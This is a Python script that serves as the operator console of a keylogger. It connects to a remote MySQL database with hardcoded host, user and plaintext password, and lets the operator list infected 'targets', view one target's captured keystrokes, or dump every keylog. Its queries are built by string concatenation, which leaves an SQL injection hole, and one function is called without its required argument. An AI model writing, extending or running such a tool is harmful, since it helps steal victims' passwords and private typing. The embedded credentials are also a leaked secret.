import mysql.connector
import base64

mydb = mysql.connector.connect(
  host="srv1401.hstgr.io",
  port=3306,
  user="u361181648_root",
  password="Samhero97go@123",
  database="u361181648_wallibear",
force_ipv6=True,
    connection_timeout=10
)

mycursor = mydb.cursor()

def view_targets():
    global mycursor
    mycursor.execute("SELECT host FROM keylogger GROUP BY host")

    myresult = mycursor.fetchall()

    for host in myresult:
        print(host)

def view_keylogs(target):
    global mycursor 
    query = "SELECT * FROM keylogger WHERE host='" + target + "' ORDER BY id DESC"
    mycursor.execute(query)
    myresult = mycursor.fetchall()

    for keylogs in myresult:
        print(keylogs)

def dump_keylogs(target):
    global mycursor 
    query = "SELECT * FROM keylogger"
    mycursor.execute(query)
    myresult = mycursor.fetchall()

    for keylogs in myresult:
        print(keylogs)

def main():
    print("(1) VIEW TARGETS")
    print("(2) VIEW KEYLOGS")
    print("(3) DUMP ALL KEYLOGS")
    print("(0) EXIT")
    op = input("Enter option: ")

    if op == "1":
        view_targets()
    elif op == "2":
        target = input("Enter target: ")
        view_keylogs(target)
    elif op == "3":
        dump_keylogs()
    elif op == "0":
        exit()
    else:
        main()

if __name__ == "__main__":
    main()